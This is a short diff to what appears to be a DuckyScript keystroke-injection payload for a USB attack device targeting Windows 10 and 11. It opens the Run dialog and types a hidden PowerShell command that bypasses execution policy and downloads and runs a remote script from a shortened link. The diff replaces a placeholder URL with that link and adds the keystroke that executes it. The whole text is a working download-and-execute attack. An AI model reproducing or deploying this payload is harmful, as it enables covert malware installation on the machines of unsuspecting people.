@@ -5,4 +5,6 @@ REM Target: Windows 10,11
 
 GUI r
 DELAY 250
-STRING powershell -w h -NoP -Ep Bypass -Command "irm 'urlHere' | iex"
+STRING powershell -w h -NoP -Ep Bypass -Command "irm bit.ly/bat-gen | iex"
+DELAY 100
+ENTER
